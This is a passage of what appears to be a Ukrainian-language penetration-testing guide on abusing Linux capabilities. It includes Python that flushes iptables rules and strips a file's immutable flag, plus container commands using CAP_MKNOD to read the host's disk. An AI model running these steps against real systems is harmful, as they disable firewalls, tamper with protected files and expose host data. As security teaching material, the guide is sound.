[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) можливість надає власнику можливість **змінювати мережеві конфігурації**, включаючи налаштування брандмауера, таблиці маршрутизації, дозволи сокетів та налаштування мережевих інтерфейсів у відкритих просторах імен мережі. Вона також дозволяє включати **режим прослуховування** на мережевих інтерфейсах, що дозволяє перехоплювати пакети в різних просторах імен.

**Приклад з використанням бінарного файлу**

Давайте припустимо, що у **бінарного файлу python** є ці можливості.
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**Це означає, що можна змінювати атрибути inode.** Ви не можете підвищити привілеї безпосередньо за допомогою цієї можливості.

**Приклад з бінарним файлом**

Якщо ви виявите, що файл є незмінним, а у python є ця можливість, ви можете **видалити незмінний атрибут і зробити файл змінюваним:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
Зверніть увагу, що зазвичай цей незмінний атрибут встановлюється та видаляється за допомогою:
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) дозволяє виконувати системний виклик `chroot(2)`, що потенційно може дозволити вибратися з оточень `chroot(2)` через відомі уразливості:

* [Як вибратися з різних рішень chroot](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
* [chw00t: інструмент виходу з chroot](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) не тільки дозволяє виконувати системний виклик `reboot(2)` для перезавантаження системи, включаючи конкретні команди, такі як `LINUX_REBOOT_CMD_RESTART2`, призначені для певних апаратних платформ, але також дозволяє використовувати `kexec_load(2)` і, починаючи з Linux 3.17, `kexec_file_load(2)` для завантаження нових або підписаних ядер аварійного відновлення відповідно.

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) був відокремлений від більш широкого **CAP_SYS_ADMIN** в Linux 2.6.37, спеціально надаючи можливість використовувати виклик `syslog(2)`. Ця здатність дозволяє переглядати адреси ядра через `/proc` та подібні інтерфейси, коли параметр `kptr_restrict` встановлено на 1, що контролює викриття адрес ядра. Починаючи з Linux 2.6.39, значення за замовчуванням для `kptr_restrict` - 0, що означає, що адреси ядра викриті, хоча багато дистрибутивів встановлюють це на 1 (приховувати адреси, крім uid 0) або 2 (завжди приховувати адреси) з міркувань безпеки.

Крім того, **CAP_SYSLOG** дозволяє отримувати доступ до виводу `dmesg`, коли `dmesg_restrict` встановлено на 1. Незважаючи на ці зміни, **CAP_SYS_ADMIN** залишає можливість виконувати операції `syslog` через історичні прецеденти.

## CAP\_MKNOD

[**CAP\_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) розширює функціональність системного виклику `mknod` поза створенням звичайних файлів, FIFO (іменованих каналів) або UNIX-доменних сокетів. Він спеціально дозволяє створювати спеціальні файли, до яких входять:

- **S_IFCHR**: Спеціальні файли символьних пристроїв, які є пристроями, наприклад, терміналами.
- **S_IFBLK**: Спеціальні файли блочних пристроїв, які є пристроями, наприклад, дисками.

Ця здатність є обов'язковою для процесів, які потребують можливості створення файлів пристроїв, що сприяє прямому взаємодії з апаратурою через символьні або блочні пристрої.

Це здатність за замовчуванням для Docker ([https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).

Ця здатність дозволяє реалізувати підвищення привілеїв (через повне читання диска) на хості за таких умов:

1. Мати початковий доступ до хоста (непривілейований).
2. Мати початковий доступ до контейнера (привілейований (EUID 0) та ефективний `CAP_MKNOD`).
3. Хост та контейнер повинні мати спільне простір імен користувача.

**Кроки для створення та доступу до блочного пристрою в контейнері:**

1. **На хості як стандартний користувач:**
- Визначте свій поточний ідентифікатор користувача за допомогою `id`, наприклад, `uid=1000(standarduser)`.
- Визначте цільовий пристрій, наприклад, `/dev/sdb`.

2. **Усередині контейнера як `root`:**
```bash
# Create a block special file for the host device
mknod /dev/sdb b 8 16
# Set read and write permissions for the user and group
chmod 660 /dev/sdb
# Add the corresponding standard user present on the host
useradd -u 1000 standarduser
# Switch to the newly created user
su standarduser
```
3. **Назад на хості:**
```bash
# Locate the PID of the container process owned by "standarduser"
# This is an illustrative example; actual command might vary
ps aux | grep -i container_name | grep -i standarduser
# Assuming the found PID is 12345
# Access the container's filesystem and the special block device
head /proc/12345/root/dev/sdb
```
### CAP\_SETPCAP

**CAP_SETPCAP** дозволяє процесу **змінювати набори можливостей** іншого процесу, дозволяючи додавати або видаляти можливості з ефективних, успадкованих та дозволених наборів. Однак процес може модифікувати лише можливості, які він має у своєму власному дозволеному наборі, забезпечуючи тим самим неможливість підвищення привілеїв іншого процесу понад свої власні. Останні оновлення ядра затвердили ці правила, обмежуючи `CAP_SETPCAP` лише для зменшення можливостей у власних або нащадкових дозволених наборах, спрямованих на зменшення ризиків безпеки. Для використання потрібно мати `CAP_SETPCAP` у ефективному наборі та цільові можливості у дозволеному наборі, використовуючи `capset()` для модифікацій. Це узагальнює основну функцію та обмеження `CAP_SETPCAP`, підкреслюючи його роль у керуванні привілеями та підвищенні безпеки.

**`CAP_SETPCAP`** - це можливість Linux, яка дозволяє процесу **змінювати набори можливостей іншого процесу**. Вона надає можливість додавати або видаляти можливості з ефективних, успадкованих та дозволених наборів можливостей інших процесів. Однак існують певні обмеження щодо того, як цю можливість можна використовувати.

Процес з `CAP_SETPCAP` **може лише надавати або видаляти можливості, які є у його власному дозволеному наборі можливостей**. Іншими словами, процес не може надавати можливість іншому процесу, якщо він сам не має цієї можливості. Це обмеження запобігає підвищенню привілеїв іншого процесу понад його власний рівень привілеїв.

Більше того, у новіших версіях ядра можливість `CAP_SETPCAP` була **додатково обмежена**. Тепер вона більше не дозволяє процесу довільно модифікувати набори можливостей інших процесів. Замість цього вона **дозволяє лише процесу знижувати можливості у власному дозволеному наборі або дозволеному наборі його нащадків**. Ця зміна була внесена для зменшення потенційних ризиків безпеки, пов'язаних з можливістю.

Для ефективного використання `CAP_SETPCAP` вам потрібно мати цю можливість у своєму ефективному наборі можливостей та цільові можливості у своєму дозволеному наборі можливостей. Після цього ви можете використовувати виклик системи `capset()` для модифікації наборів можливостей інших процесів.

Отже, `CAP_SETPCAP` дозволяє процесу змінювати набори можливостей інших процесів, але він не може надавати можливості, яких у нього немає. Крім того, через питання безпеки, його функціональність була обмежена в останніх версіях ядра, щоб дозволити лише зниження можливостей у власному дозволеному наборі або дозволених наборах його нащадків.
